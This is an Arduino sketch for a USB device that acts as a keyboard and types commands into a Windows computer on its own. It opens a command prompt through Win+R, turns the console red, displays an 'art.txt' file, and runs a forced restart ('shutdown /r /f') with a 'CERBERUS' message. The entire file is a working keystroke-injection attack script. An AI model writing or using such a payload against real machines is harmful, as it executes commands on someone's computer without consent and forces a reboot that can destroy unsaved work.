#include <Keyboard.h>

void setup() {
    Keyboard.begin();
    delay(1200);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    delay(300);

    Keyboard.print("cmd");
    delay(100);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);

    Keyboard.print("@echo off");
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.releaseAll();

    Keyboard.print("mode con: cols=160 lines=40");
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.releaseAll();

    Keyboard.print("color 4");
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.releaseAll();

    Keyboard.print("cls");
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.releaseAll();

    Keyboard.print("type art.txt");
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.releaseAll();

    Keyboard.print("shutdown /r /f /t 10 /c \"CERBERUS: System reboot\"");
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.releaseAll();

    Keyboard.end();
}

void loop() {
    // пусто
}
